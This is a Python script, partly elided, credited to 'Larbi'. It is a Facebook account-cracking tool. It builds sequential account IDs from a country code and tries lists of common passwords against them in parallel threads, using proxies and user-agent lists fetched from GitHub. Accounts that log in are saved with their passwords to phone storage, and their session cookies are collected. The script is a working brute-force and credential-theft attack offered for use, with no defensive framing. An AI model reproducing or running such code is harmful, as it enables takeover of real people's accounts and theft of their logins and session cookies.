#DECODE/BY/SaManDar
#Larbi
fbks=('https://www.facebook.com/profile.php?id=693514060')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=69354060')

try:
	prox= requests.get('https://github.com/Larbihannachi/Larbi.H.N.git/data/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://github.com/Larbihannachi/Larbi.H.N.git/data/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	jf=requests.get('https://github.com/Larbihannachi/Larbi.H.N.git/data/main/ua.txt').text.splitlines()
	for us in jf:
		usr.append(us)
except: pass
...
================================================
\033[1;31m================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{Larbi}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{ Larbi}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{Larbi}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{Larbi}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+213675585110}\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mNETWORK \33[1;31m   ┇\033[1;37m{ 4G /LTE }\33[0;m
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [LARBI.HANNACHI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [LARBI.HANNACHI-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/LARBI.HANNACHI-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [LARBI.HANNACHI-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/LARBI.HANNACHI-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/LARBI.HANNCHI-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','1000300','700800','900900','10002000','50006000','Alg100200','Alg1234','PUBG123','afghanistan','Algria','PUBG1234','الجزائز','khan12','khan123','jan123','asdasd123123','afghan500600','123456789','987654321','۹۸۷۶۵۴۳۲۱','koko1234','facebook','Facebook','FACEBOOK','123123','12341234','707070','pubg123','King100200','king100200','King500600','king500600','khankhan','prince ','prince1212','prince123']
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [LARBI.HANNACHI]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [LARBI.HANNACHI==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/LARBI.HANNACHI-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/LARBI.HANNACHI-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
